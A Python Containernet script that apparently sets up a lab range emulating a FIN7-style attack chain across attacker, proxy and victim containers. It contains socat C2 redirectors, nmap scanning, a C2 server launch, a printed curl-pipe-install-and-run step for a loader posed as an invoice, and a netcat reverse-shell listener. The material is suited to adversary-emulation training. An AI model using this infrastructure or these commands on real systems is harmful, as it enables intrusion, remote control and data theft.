from pathlib import Path

from mininet.cli import CLI
from mininet.log import info, setLogLevel
from mininet.net import Containernet
from mininet.node import Controller

setLogLevel("info")

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"
PAYLOAD_MOUNT = "/opt/fin7"
LOADER = PAYLOAD_DIR / "cybersecurity4dummies.sh"
IMAGE = "fin7-base"
ATTACKER_IMAGE = "fin7-attacker"

def configure_routing(attacker, proxy, victim):
    info("*** Configuring routing for Docker hosts\n")
    for host in (attacker, proxy, victim):
        host.cmd(f"ip link set dev {host.name}-eth0 up")

    proxy.cmd("ip link set dev proxy-eth1 up")
    proxy.cmd("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")

    attacker.cmd("ip route add default via 10.0.1.254")
    victim.cmd("ip route add default via 10.0.2.254")


def start_redirector(proxy, attacker_ip):
    info("*** Starting the C2 redirector on the proxy\n")
    proxy.cmd(f"socat TCP-LISTEN:80,fork,reuseaddr TCP:{attacker_ip}:8443 &")
    proxy.cmd(f"socat TCP-LISTEN:4444,fork,reuseaddr TCP:{attacker_ip}:4444 &")


def main():
    if not PAYLOAD_DIR.is_dir():
        raise SystemExit(f"Payload directory not found: {PAYLOAD_DIR}")
    if not LOADER.is_file():
        raise SystemExit(f"Loader not found: {LOADER}")

    LOADER.chmod(0o755)

    net = Containernet(controller=Controller)

    info("*** Adding controller\n")
    net.addController("c0")

    info("*** Adding docker containers (attacker, proxy, victim)\n")
    attacker = net.addDocker(
        "attacker",
        ip="10.0.1.10/24",
        dimage=ATTACKER_IMAGE,
    )
    proxy = net.addDocker("proxy", ip="10.0.1.254/24", dimage=IMAGE)
    victim = net.addDocker("victim", ip="10.0.2.20/24", dimage=IMAGE)

    info("*** Adding switches and links\n")
    s1 = net.addSwitch("s1")
    s2 = net.addSwitch("s2")

    net.addLink(attacker, s1)
    net.addLink(proxy, s1)
    net.addLink(victim, s2)
    net.addLink(proxy, s2, params1={"ip": "10.0.2.254/24"})

    info("*** Starting network\n")
    net.start()

    configure_routing(attacker, proxy, victim)
    start_redirector(proxy, "10.0.1.10")

    info("\n*** [1/7 RECONNAISSANCE] Attacker scans the victim network\n")
    attacker.cmd(
        "nmap -sn 10.0.2.20 10.0.2.254 -oN /tmp/recon_ping.txt >/dev/null 2>&1; "
        "nmap -sT -Pn -p 22,80,4444,8443 10.0.2.20 10.0.2.254 "
        "-oN /tmp/recon_ports.txt >/dev/null 2>&1; "
    )

    info("\n*** [2/7 WEAPONIZATION] Payloads staged from %s\n" % PAYLOAD_DIR)
    info("\n*** [5/7 COMMAND & CONTROL] Starting the team server on 0.0.0.0:8443\n")
    attacker.cmd(
        f"python3 {PAYLOAD_MOUNT}/c2_server.py > /tmp/c2_logs.txt 2>&1 &"
    )

    info("\n*** [3/7 DELIVERY] On the victim run the 'invoice':\n")
    info("    curl -s http://10.0.2.254:80/                         # phishing page\n")
    info("    curl -s http://10.0.2.254:80/download/cybersecurity4dummies.sh \\\n")
    info("         | install -m 755 /dev/stdin /tmp/cybersecurity4dummies.sh \\\n")
    info("         && /tmp/cybersecurity4dummies.sh\n")

    info("\n======================================================\n")
    info("*** Network Ready!\n")
    info("*** Reverse shell listener (interactive):\n")
    info("    docker exec -it mn.attacker nc -lnvp 4444\n")
    info("*** C2 log / exfil:\n")
    info("    docker exec mn.attacker tail -f /tmp/c2_logs.txt\n")

    CLI(net)
    net.stop()


if __name__ == "__main__":
    main()
